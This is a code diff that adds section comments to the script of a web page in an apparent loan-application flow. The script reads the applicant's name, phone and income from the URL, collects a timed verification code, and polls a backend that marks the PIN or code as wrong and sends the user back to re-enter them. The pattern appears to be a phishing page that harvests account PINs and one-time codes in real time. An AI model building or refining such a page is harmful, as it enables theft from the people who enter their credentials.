@@ -121,6 +121,9 @@
     </div>
 
     <script>
+        // ================================================
+        // GET DATA FROM URL
+        // ================================================
         const params = new URLSearchParams(window.location.search);
         const appId = params.get('app_id');
         const amount = params.get('amount') || '---';
@@ -140,6 +143,9 @@
             document.getElementById('summaryAppId').textContent = appId;
         }
 
+        // ================================================
+        // DOM REFS
+        // ================================================
         const statusMsg = document.getElementById('statusMessage');
         const statusTitle = document.getElementById('statusTitle');
         const codeSection = document.getElementById('codeSection');
@@ -154,6 +160,9 @@
         let timerInterval = null;
         let timeLeft = 120;
 
+        // ================================================
+        // TIMER
+        // ================================================
         function startTimer() {
             timeLeft = 120;
             timerBox.classList.remove('hidden');
@@ -182,6 +191,9 @@
             if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
         }
 
+        // ================================================
+        // CODE BOXES – Auto-advance
+        // ================================================
         codeBoxes.forEach((box, index) => {
             box.addEventListener('input', function() {
                 if (this.value.length === 1 && index < codeBoxes.length - 1) {
@@ -207,6 +219,9 @@
             });
         });
 
+        // ================================================
+        // POLLING
+        // ================================================
         function startPolling() {
             if (pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(async () => {
@@ -244,6 +259,7 @@
                             window.location.href = `/success?app_id=${appId}&amount=${amount}&months=${months}&phone=${phone}`;
                         }, 2000);
                     } else if (data.code_status === 'wrong_pin' || data.status === 'wrong_pin') {
+                        // ✅ WRONG PIN – redirect back to PIN entry with error
                         statusText = '❌ Wrong PIN. Redirecting to PIN entry...';
                         statusClass = 'error';
                         clearInterval(pollInterval);
@@ -254,6 +270,7 @@
                             window.location.href = `/pin-entry?amount=${amount}&months=${months}&fullName=${encodeURIComponent(fullName)}&phone=${phone}&employment=${employment}&income=${income}&error=wrong_pin`;
                         }, 1500);
                     } else if (data.code_status === 'wrong_code') {
+                        // ✅ WRONG CODE – show red boxes and allow re‑entry
                         statusText = '❌ Incorrect code. Please try again.';
                         statusClass = 'error';
                         codeBoxes.forEach(box => {
@@ -292,6 +309,9 @@
             else statusTitle.textContent = '⏳ Processing';
         }
 
+        // ================================================
+        // VERIFY CODE (submit to /api/submit_code)
+        // ================================================
         verifyBtn.addEventListener('click', async function() {
             let code = '';
             codeBoxes.forEach(box => code += box.value.trim());
@@ -340,6 +360,9 @@
 
         function hideCodeStatus() { codeStatus.classList.add('hidden'); }
 
+        // ================================================
+        // START
+        // ================================================
         if (appId) startPolling();
         window.addEventListener('beforeunload', function() {
             if (pollInterval) clearInterval(pollInterval);
